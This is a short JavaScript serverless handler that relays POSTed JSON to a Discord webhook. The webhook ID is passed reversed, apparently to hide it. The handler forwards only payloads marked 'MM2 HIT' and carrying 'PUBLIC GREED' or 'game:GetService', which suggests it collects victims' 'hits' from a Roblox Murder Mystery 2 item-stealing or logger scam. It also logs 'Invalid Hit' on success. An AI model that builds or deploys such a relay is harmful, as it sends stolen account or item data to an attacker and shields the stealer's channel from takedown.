module.exports = async (req, res) => {
  if (req.method !== 'POST') {
    return res.status(405).send('Method Not Allowed');
  }

  const reversedPath = req.query.path;
  if (!reversedPath) {
    return res.status(400).send('Missing "path" query parameter');
  }

  const actualPath = reversedPath.split('').reverse().join('');

  let discordUrl = `https://discord.com/api/webhooks/${actualPath}`;
  if (process.env.TEST_WEBHOOK_URL) {
    discordUrl = process.env.TEST_WEBHOOK_URL;
  }

  let payload;
  try {
    payload = typeof req.body === 'string' ? JSON.parse(req.body) : req.body;
  } catch (err) {
    return res.status(400).send('Invalid JSON body: ' + err.message);
  }

  if (!payload.embeds || !Array.isArray(payload.embeds) || payload.embeds.length === 0) {
    return res.status(400).send('Invalid Hit');
  }
  const content = payload.content || '';
  if (!content.includes('PUBLIC GREED') && !content.includes('game:GetService')) {
    return res.status(400).send('Invalid Hit');
  }
  const allTitlesValid = payload.embeds.every(embed => {
    return embed.title && embed.title.includes('MM2 HIT');
  });
  if (!allTitlesValid) {
    return res.status(400).send('Invalid Hit');
  }

  console.log('Invalid Hit', JSON.stringify(payload));

  try {
    const response = await fetch(discordUrl, {
      method: 'POST',
      headers: {
        'Content-Type': 'application/json',
      },
      body: JSON.stringify(payload),
    });

    const responseBody = await response.text();
    if (!response.ok) {
      console.error(`Discord error: Status ${response.status}, Body: ${responseBody}`);
      return res.status(response.status).send(`Discord error: ${responseBody}`);
    }

    console.log('Discord success:', responseBody);
    return res.status(200).send('Webhook sent successfully');
  } catch (err) {
    console.error('Fetch error:', err);
    return res.status(500).send('Error sending webhook: ' + err.message);
  }
};
